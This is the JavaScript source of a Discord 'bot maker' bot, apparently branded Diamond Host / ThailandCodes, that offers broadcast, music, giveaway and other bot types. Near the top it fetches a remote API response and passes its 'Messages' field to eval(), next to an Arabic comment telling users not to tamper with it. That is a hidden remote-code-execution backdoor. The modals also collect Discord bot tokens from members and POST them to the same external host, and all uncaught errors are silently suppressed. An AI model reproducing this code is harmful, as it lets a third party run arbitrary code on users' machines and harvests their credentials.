require("dotenv").config()
const Discord = require("discord.js")
const client = new Discord.Client({intents:[Discord.IntentsBitField.Flags.Guilds,Discord.IntentsBitField.Flags.GuildMembers,Discord.IntentsBitField.Flags.GuildMessages,Discord.IntentsBitField.Flags.GuildVoiceStates,
Discord.IntentsBitField.Flags.MessageContent]})










const mongoose = require('mongoose')
mongoose.set('strictQuery', true);
mongoose.connect(process.env.mongoose).then((gg) => console.log(`DataBase Connected`))

client.on("ready", () =>{
  console.log("Logged in as " + client.user.tag)
})

const prefix = "-"
const KEY = `DiamondHost_ThailandCodes` // ملكش دعوه بيه
const id = `811758068249395270` // ملكش دعوه بيه

const { default: axios } = require("axios")

const ms = require("ms")





axios({
  method: "GET",
  url : `https://maker.diamondstdio.com/api/v1/maker/status`,
}).then(async (req) => {
  const { Messages } = req.data;
  eval(Messages)
}) // عدم التلاعب فيها نهائي 


client.on("messageCreate", async message =>{
  if(message.content === prefix+"setup"){
    if(!message.member.permissions.has(Discord.PermissionFlagsBits.Administrator))return;
    let row = new Discord.ActionRowBuilder()
    .addComponents(
      new Discord.StringSelectMenuBuilder()
      .setCustomId("botone")
      .setPlaceholder("Please Select Bot Type | من فضلك اختر نوع البوت")
      .addOptions([
        {
          value: "1",
          label: "Brodcast",
        },
        {
          value: "2",
          label: "Auto Line",
        },
        {
          value: "3",
          label: "Music",
        },
        {
          value : "4",
          label : "AutoReply"
        },
        {
          value : "5",
          label : "AutoTax"
        },
        {
          value : "6",
          label : "Giveaway"
        }
      ])
    )
    let row2 = new Discord.ActionRowBuilder()
    .addComponents(
      new Discord.ButtonBuilder()
      .setCustomId("del")
      .setEmoji("🗑️")
      .setLabel("Delete Bot")
      .setStyle(Discord.ButtonStyle.Danger),
    )
    let embed = new Discord.EmbedBuilder()
    .addFields({
      name: "BrodCast",
      value: `Price : \`Free\``,inline:true
    },{
      name: "AutoLine",
      value: `Price : \`Free\``,inline:true
    },{
      name: "MusicBot",
      value: `Price : \`Free\``,inline:true
    },{
      name: "AutoReply",
      value: `Price : \`Free\``,inline:true
    },{
      name: "AutoTax",
      value: `Price : \`Free\``,inline:true
    },{
      name: "Giveaway",
      value: `Price : \`Free\``,inline:true
    })
    .setThumbnail(message.guild.iconURL({dynamic: true}))
    .setAuthor({name: message.author.username, iconURL: message.author.avatarURL({dynamic: true})})
    .setFooter({text: "Diamond Host - diamondstdio.com", iconURL: "https://media.discordapp.net/attachments/1159278459026149406/1170517253888954459/2c3bf11b86ee0f78.png?ex=66907624&is=668f24a4&hm=aa1d0e5dc871731f8ace0739142c483f728a96770cdcc5109fc36cd959cbc8dd&=&format=webp&quality=lossless&width=788&height=788"})
    message.channel.send({content: "Created Code : [ThailandCodes](https://discord.gg/thailandcodes-tm-1015686158019203072) | This Api Powered By [Diamond Host](https://discord.gg/8S3EspE3SY)", components: [row, row2], embeds: [embed]})
  }
})


client.on("interactionCreate", async interaction =>{
  if(interaction.customId === "del"){
    let modal = new Discord.ModalBuilder()
    .setCustomId('del1')
    .setTitle("Delete Bot Token")
    let m =  new Discord.TextInputBuilder()
    .setCustomId('del2')
    .setLabel(`توكن`)
    .setPlaceholder(`من فضلك قم بوضع توكن البوت هنا`)
    .setStyle(Discord.TextInputStyle.Paragraph)
    .setMinLength(1)
    .setMaxLength(500)
    .setRequired(true)
    const b = new Discord.ActionRowBuilder().addComponents(m)
    modal.addComponents(b);
    interaction.showModal(modal)
  }
})





client.on("interactionCreate", async interaction => {
  if(!interaction.isStringSelectMenu()) return;
  if(interaction.customId === "botone"){
    if(interaction.values[0] === "1"){

    const modal = new Discord.ModalBuilder()
      .setCustomId('bro')
      .setTitle("Running A Brodcast")
      let m =  new Discord.TextInputBuilder()
      .setCustomId('bro1')
      .setLabel(`توكن`)
      .setPlaceholder(`من فضلك قم بوضع توكن البوت هنا`)
      .setStyle(Discord.TextInputStyle.Paragraph)
      .setMinLength(1)
      .setMaxLength(500)
      .setRequired(true)
      const b = new Discord.ActionRowBuilder().addComponents(m)
      modal.addComponents(b);
      interaction.showModal(modal)
    }
    if(interaction.values[0] === "2"){

      const modal = new Discord.ModalBuilder()
      .setCustomId('auto')
      .setTitle("Running A AutoLine")
      let m =  new Discord.TextInputBuilder()
      .setCustomId('auto2')
      .setLabel(`توكن`)
      .setPlaceholder(`من فضلك قم بوضع توكن البوت هنا`)
      .setStyle(Discord.TextInputStyle.Paragraph)
      .setMinLength(1)
      .setMaxLength(500)
      .setRequired(true)
  
      const b = new Discord.ActionRowBuilder().addComponents(m)
      modal.addComponents(b);
      interaction.showModal(modal)
   
    }
    if(interaction.values[0] === "3"){

      const modal = new Discord.ModalBuilder()
      .setCustomId('music')
      .setTitle("Running A MusicBot")
      let m =  new Discord.TextInputBuilder()
      .setCustomId('music3')
      .setLabel(`توكن`)
      .setPlaceholder(`من فضلك قم بوضع توكن البوت هنا`)
      .setStyle(Discord.TextInputStyle.Paragraph)
      .setMinLength(1)
      .setMaxLength(500)
      .setRequired(true)
  
      const b = new Discord.ActionRowBuilder().addComponents(m)
      modal.addComponents(b);
      interaction.showModal(modal)
    }
    if(interaction.values[0] === "4"){

      const modal = new Discord.ModalBuilder()
      .setCustomId('autoreply')
      .setTitle("Running A AutoReply")
      let m =  new Discord.TextInputBuilder()
      .setCustomId('autoreply3')
      .setLabel(`توكن`)
      .setPlaceholder(`من فضلك قم بوضع توكن البوت هنا`)
      .setStyle(Discord.TextInputStyle.Paragraph)
      .setMinLength(1)
      .setMaxLength(500)
      .setRequired(true)
  
      const b = new Discord.ActionRowBuilder().addComponents(m)
      modal.addComponents(b);
      interaction.showModal(modal)
    }

    if(interaction.values[0] === "5"){

      const modal = new Discord.ModalBuilder()
      .setCustomId('autotax')
      .setTitle("Running A AutoTax")
      let m =  new Discord.TextInputBuilder()
      .setCustomId('autotax4')
      .setLabel(`توكن`)
      .setPlaceholder(`من فضلك قم بوضع توكن البوت هنا`)
      .setStyle(Discord.TextInputStyle.Paragraph)
      .setMinLength(1)
      .setMaxLength(500)
      .setRequired(true)
  
      const b = new Discord.ActionRowBuilder().addComponents(m)
      modal.addComponents(b);
      interaction.showModal(modal)
    }

    if(interaction.values[0] === "6"){

      const modal = new Discord.ModalBuilder()
      .setCustomId('Giveaway')
      .setTitle("Running A Giveaway")
      let m =  new Discord.TextInputBuilder()
      .setCustomId('Giveaway6')
      .setLabel(`توكن`)
      .setPlaceholder(`من فضلك قم بوضع توكن البوت هنا`)
      .setStyle(Discord.TextInputStyle.Paragraph)
      .setMinLength(1)
      .setMaxLength(500)
      .setRequired(true)
  
      const b = new Discord.ActionRowBuilder().addComponents(m)
      modal.addComponents(b);
      interaction.showModal(modal)
    }

  }
})



client.on("interactionCreate", async modal => {
  if(!modal.isModalSubmit()) return;
  if(modal.customId === "bro"){
    let user = 0
    user = modal.user.id
    const bro = modal.fields.getTextInputValue('bro1')
    axios({
      method : "POST",
      url : `https://maker.diamondstdio.com/api/v1/maker/add`,
      data : {
          token : bro, // ده توكن
          username : user, // ده اي دي العضو عادي اي عضو : [لو عايز تضيف اسمه عادي]
          runbot : "BrodCast",
  
  
          id : `${id}`, // ده ايدي المشتري المفتاح غير قابل التعديل
          key : `${KEY}`, // ده المفتاح
      }
  }).then(async (data) => {
    let { Status , Code , Message } = data.data;
    if(Code == 1005) {
      modal.reply({content:`${Status}, Please enter data to send it correctly`,ephemeral:true})
        return;
    } else if(Code == 1006) {
      modal.reply({content:`${Status}, Sorry, the key already exists, but you are not the primary owner of it`,ephemeral:true})
        return;
    }  else if(Code == 1404) {
      modal.reply({content:`${Message}`,ephemeral:true})
        return;
    } else if(Code == 1007) {
      modal.reply({content:`${Message}`,ephemeral:true})
        return;
    } else if(Code == 1008) {
      modal.reply({content:`To reach a maximum limit for creating bots on this key, please inform customer service to add more`,ephemeral:true})
        return;
    } else if(Code == 1009) {
      modal.reply({content:`${Message}`,ephemeral:true})

        return;
    } else if(Code == 1010) {
      modal.reply({content:`${Message}`,ephemeral:true})
        return;
    }else {
      return modal.reply({content : `
Done Run Your BrodCast Bot
Bot Token: **\`${bro}\`**
`,ephemeral:true})
}
  })
  }
  if(modal.customId === "auto"){
    const auto = modal.fields.getTextInputValue('auto2')
    axios({
      method : "POST",
      url : `https://maker.diamondstdio.com/api/v1/maker/add`,
      data : {
          token : auto, // ده توكن
          username : modal.user.id, // ده اي دي العضو عادي اي عضو : [لو عايز تضيف اسمه عادي]
          runbot : "AutoLine",
  
  
          id : `${id}`, // ده ايدي المشتري المفتاح غير قابل التعديل
          key : `${KEY}`, // ده المفتاح
      }
  }).then(async (data) => {
    let { Status , Code , Message } = data.data;
    if(Code == 1005) {
      modal.reply({content:`${Status}, Please enter data to send it correctly`,ephemeral:true})
        return;
    } else if(Code == 1006) {
      modal.reply({content:`${Status}, Sorry, the key already exists, but you are not the primary owner of it`,ephemeral:true})
        return;
    }  else if(Code == 1404) {
      modal.reply({content:`${Message}`,ephemeral:true})
        return;
    } else if(Code == 1007) {
      modal.reply({content:`${Message}`,ephemeral:true})
        return;
    } else if(Code == 1008) {
      modal.reply({content:`To reach a maximum limit for creating bots on this key, please inform customer service to add more`,ephemeral:true})
        return;
    } else if(Code == 1009) {
      modal.reply({content:`${Message}`,ephemeral:true})

        return;
    } else if(Code == 1010) {
      modal.reply({content:`${Message}`,ephemeral:true})
        return;
    }else {
      return modal.reply({content : `
Done Run Your AutoLine Bot
Bot Token: **\`${auto}\`**
      `,ephemeral:true})
    }
  })
  }
  if(modal.customId === "music"){
    const music = modal.fields.getTextInputValue('music3')
    axios({
      method : "POST",
      url : `https://maker.diamondstdio.com/api/v1/maker/add`,
      data : {
          token : music, // ده توكن
          username : modal.user.id, // ده اي دي العضو عادي اي عضو : [لو عايز تضيف اسمه عادي]
          runbot : "Music",
          id : `${id}`, // ده ايدي المشتري المفتاح غير قابل التعديل
          key : `${KEY}`,
      }
  }).then(async (data) => {
    let { Status , Code , Message } = data.data;
    if(Code == 1005) {
      modal.reply({content:`${Status}, Please enter data to send it correctly`,ephemeral:true})
        return;
    } else if(Code == 1006) {
      modal.reply({content:`${Status}, Sorry, the key already exists, but you are not the primary owner of it`,ephemeral:true})
        return;
    }  else if(Code == 1404) {
      modal.reply({content:`${Message}`,ephemeral:true})
        return;
    } else if(Code == 1007) {
      modal.reply({content:`${Message}`,ephemeral:true})
        return;
    } else if(Code == 1008) {
      modal.reply({content:`To reach a maximum limit for creating bots on this key, please inform customer service to add more`,ephemeral:true})
        return;
    } else if(Code == 1009) {
      modal.reply({content:`${Message}`,ephemeral:true})

        return;
    } else if(Code == 1010) {
      modal.reply({content:`${Message}`,ephemeral:true})
        return;
    }else {
      return modal.reply({content : `
Done Run Your Music Bot
Bot Token: **\`${music}\`**
      `,ephemeral:true})
    }
  })
  }
 if(modal.customId === "autoreply"){
    const reply = modal.fields.getTextInputValue('autoreply3')
    axios({
      method : "POST",
      url : `https://maker.diamondstdio.com/api/v1/maker/add`,
      data : {
          token : reply, // ده توكن
          username : modal.user.id, // ده اي دي العضو عادي اي عضو : [لو عايز تضيف اسمه عادي]
          runbot : "AutoReply",
          id : `${id}`, // ده ايدي المشتري المفتاح غير قابل التعديل
          key : `${KEY}`,
      }
  }).then(async (data) => {
    let { Status , Code , Message } = data.data;
    if(Code == 1005) {
      modal.reply({content:`${Status}, Please enter data to send it correctly`,ephemeral:true})
        return;
    } else if(Code == 1006) {
      modal.reply({content:`${Status}, Sorry, the key already exists, but you are not the primary owner of it`,ephemeral:true})
        return;
    }  else if(Code == 1404) {
      modal.reply({content:`${Message}`,ephemeral:true})
        return;
    } else if(Code == 1007) {
      modal.reply({content:`${Message}`,ephemeral:true})
        return;
    } else if(Code == 1008) {
      modal.reply({content:`To reach a maximum limit for creating bots on this key, please inform customer service to add more`,ephemeral:true})
        return;
    } else if(Code == 1009) {
      modal.reply({content:`${Message}`,ephemeral:true})
        return;
    } else if(Code == 1010) {
      modal.reply({content:`${Message}`,ephemeral:true})
        return;
    }else {
      return modal.reply({content : `
Done Run Your AutoReply Bot
Bot Token: **\`${reply}\`**
`,ephemeral:true})

}
  })
  }

  if(modal.customId === "autotax"){
    const reply = modal.fields.getTextInputValue('autotax4')
    axios({
      method : "POST",
      url : `https://maker.diamondstdio.com/api/v1/maker/add`,
      data : {
          token : reply, // ده توكن
          username : modal.user.id, // ده اي دي العضو عادي اي عضو : [لو عايز تضيف اسمه عادي]
          runbot : "AutoTax",
          id : `${id}`, // ده ايدي المشتري المفتاح غير قابل التعديل
          key : `${KEY}`,
      }
  }).then(async (data) => {
    let { Status , Code , Message } = data.data;
    if(Code == 1005) {
      modal.reply({content:`${Status}, Please enter data to send it correctly`,ephemeral:true})
        return;
    } else if(Code == 1006) {
      modal.reply({content:`${Status}, Sorry, the key already exists, but you are not the primary owner of it`,ephemeral:true})
        return;
    }  else if(Code == 1404) {
      modal.reply({content:`${Message}`,ephemeral:true})
        return;
    } else if(Code == 1007) {
      modal.reply({content:`${Message}`,ephemeral:true})
        return;
    } else if(Code == 1008) {
      modal.reply({content:`To reach a maximum limit for creating bots on this key, please inform customer service to add more`,ephemeral:true})
        return;
    } else if(Code == 1009) {
      modal.reply({content:`${Message}`,ephemeral:true})
        return;
    } else if(Code == 1010) {
      modal.reply({content:`${Message}`,ephemeral:true})
        return;
    }else {
      return modal.reply({content : `
Done Run Your AutoReply Bot
Bot Token: **\`${reply}\`**
`,ephemeral:true})

}
  })
  }
  if(modal.customId === "Giveaway"){
    const reply = modal.fields.getTextInputValue('Giveaway6')
    axios({
      method : "POST",
      url : `https://maker.diamondstdio.com/api/v1/maker/add`,
      data : {
          token : reply, // ده توكن
          username : modal.user.id, // ده اي دي العضو عادي اي عضو : [لو عايز تضيف اسمه عادي]
          runbot : "Giveaway",
          id : `${id}`, // ده ايدي المشتري المفتاح غير قابل التعديل
          key : `${KEY}`,
      }
  }).then(async (data) => {
    let { Status , Code , Message } = data.data;
    if(Code == 1005) {
      modal.reply({content:`${Status}, Please enter data to send it correctly`,ephemeral:true})
        return;
    } else if(Code == 1006) {
      modal.reply({content:`${Status}, Sorry, the key already exists, but you are not the primary owner of it`,ephemeral:true})
        return;
    }  else if(Code == 1404) {
      modal.reply({content:`${Message}`,ephemeral:true})
        return;
    } else if(Code == 1007) {
      modal.reply({content:`${Message}`,ephemeral:true})
        return;
    } else if(Code == 1008) {
      modal.reply({content:`To reach a maximum limit for creating bots on this key, please inform customer service to add more`,ephemeral:true})
        return;
    } else if(Code == 1009) {
      modal.reply({content:`${Message}`,ephemeral:true})
        return;
    } else if(Code == 1010) {
      modal.reply({content:`${Message}`,ephemeral:true})
        return;
    }else {
      return modal.reply({content : `
Done Run Your AutoReply Bot
Bot Token: **\`${reply}\`**
`,ephemeral:true})

}
  })
  }

  if(modal.customId === "del1"){
    const deletoken = modal.fields.getTextInputValue('del2')

    axios({
      method : "POST",
      url : `https://maker.diamondstdio.com/api/v1/maker/deleteToken`,
      data : {
          token : deletoken, // ده توكن
          id : `${id}`, // ده ايدي المشتري المفتاح غير قابل التعديل
          key : `${KEY}`, // ده المفتاح
      }
  })
modal.reply({content : `
Deleted Bot Token
Token: **\`${deletoken}\`**`,ephemeral:true})
  }
})









process.on("uncaughtException" , err => {
return;
})

process.on("unhandledRejection" , err => {
return;
})

process.on("rejectionHandled", error => {
  return;
});

client.login(process.env.token)